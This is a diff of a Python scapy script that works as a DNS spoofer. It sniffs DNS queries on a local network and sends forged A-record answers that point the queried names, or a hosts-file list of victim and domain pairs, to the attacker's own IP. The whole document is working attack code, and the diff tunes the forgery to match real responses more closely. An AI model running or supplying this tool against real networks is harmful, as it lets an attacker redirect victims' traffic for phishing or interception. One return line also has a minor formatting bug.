@@ -3,24 +3,47 @@ import sys, getopt
 import netifaces
 
 
-def callback(dict, local_ip):
+def callback(map, local_ip):
     def get_response(pkt):
-        if len(dict) == 0:
-            if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src != local_ip:
-                if str(pkt['DNS Question Record'].qname):
-                    spoofed_packet = IP(dst=pkt[IP].src) \
-                                     / UDP(dport=pkt[UDP].sport, sport=53) \
-                                     / DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip))
+        if not DNS in pkt:
+            return
+        # if IP in pkt:
+        #     print repr(pkt[IP])
+        if not DNSQR in pkt:
+            return
+        is_query = (pkt[DNS].qr == 0)
+        is_ancnt_0 = (pkt[DNS].ancount == 0)
+        is_type_A = (pkt[DNSQR].qtype == 1)
+        src_ip = pkt[IP].src
+        dst_ip = pkt[IP].dst
+        q_name = str(pkt[DNSQR].qname)
+        d_port = pkt[UDP].dport
+        s_port = pkt[UDP].sport
+        txn_id = pkt[DNS].id
+        # print "is_query: {0}, is_ancnt: {1}, is_type_A: {2}, type_A:{3}".format(is_query, is_ancnt_0, is_type_A,
+        #                                                                         pkt[DNSQR].qtype)
+        if len(map) == 0:
+            if is_query and is_ancnt_0 and is_type_A and src_ip != local_ip:
+                if q_name:
+                    spoofed_packet = IP(dst=src_ip, src=dst_ip) \
+                                     / UDP(dport=s_port, sport=d_port) \
+                                     / DNS(id=txn_id, ancount=1, qr=1, an=DNSRR(rrname=q_name, rdata=local_ip))
                     send(spoofed_packet, verbose=0)
-                return 'Spoofed DNS Response Sent'
+                    # return 'Spoofed DNS Response Sent - URL: {0}'.format(pkt[DNSQR].qname, str(pkt[DNS].id), local_ip)
+                    return 'Spoofed DNS Response Sent - {0}'.format(spoofed_packet.summary())
+                else:
+                    return
         else:
-            if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP].src in dict:
-                if str(pkt['DNS Question Record'].qname):
-                    spoofed_packet = IP(dst=pkt[IP].src) \
-                                     / UDP(dport=pkt[UDP].sport, sport=53) \
-                                     / DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip))
-                    send(spoofed_packet, verbose=0)
-                return 'Spoofed DNS Response Sent'
+            is_url_match = ((src_ip, q_name) in map)
+            # print "Url match: {0}".format(is_url_match)
+            if q_name and is_query and is_ancnt_0 and is_type_A and ((src_ip, q_name) in map):
+                spoofed_packet = IP(dst=src_ip, src=dst_ip) \
+                                 / UDP(dport=s_port, sport=d_port) \
+                                 / DNS(id=txn_id, ancount=1, qr=1,an=DNSRR(rrname=q_name, rdata=local_ip))
+                send(spoofed_packet, verbose=0)
+                return 'Spoofed DNS Response Sent - URL: {0}'.format(spoofed_packet.summary)
+            else:
+                return
 
     return get_response
 
@@ -68,23 +91,30 @@ def get_default_interface():
 
 
 def main(argv):
-    dict = {}
+    map = set()
     hosts_file, interface_name, bpf_expr = parse_args(argv)
     if hosts_file is not '':
         try:
             with open(hosts_file) as f:
                 for line in f:
                     ip, url = line.partition(" ")[::2]
-                    dict[ip.strip()] = url.strip()
-            print "Dict is " + str(dict)
+                    ip = ip.strip()
+                    url = url.strip()
+                    if not url.endswith("."):
+                        url += "."
+                    map.add((ip, url))
+
+            print "Dict is " + str(map)
         except OSError:
-            print('Error in opening host_mapping file:' + hosts_file);
+            print('Error in opening host_mapping file:' + hosts_file)
             sys.exit(2)
 
     bpf_filt = 'udp port 53' if (bpf_expr is '') else bpf_expr
-    # interface = get_default_interface() if interface_name is '' else interface_name
-    interface = get_default_interface()
-    sniff(filter=bpf_filt, prn=callback(dict, get_local_ip(interface)))
+    interface = get_default_interface() if interface_name is '' else interface_name
+    print interface
+    local_ip = get_local_ip(interface)
+    print local_ip
+    sniff(iface=interface, filter=bpf_filt, prn=callback(map, local_ip))
 
 
 if __name__ == "__main__":
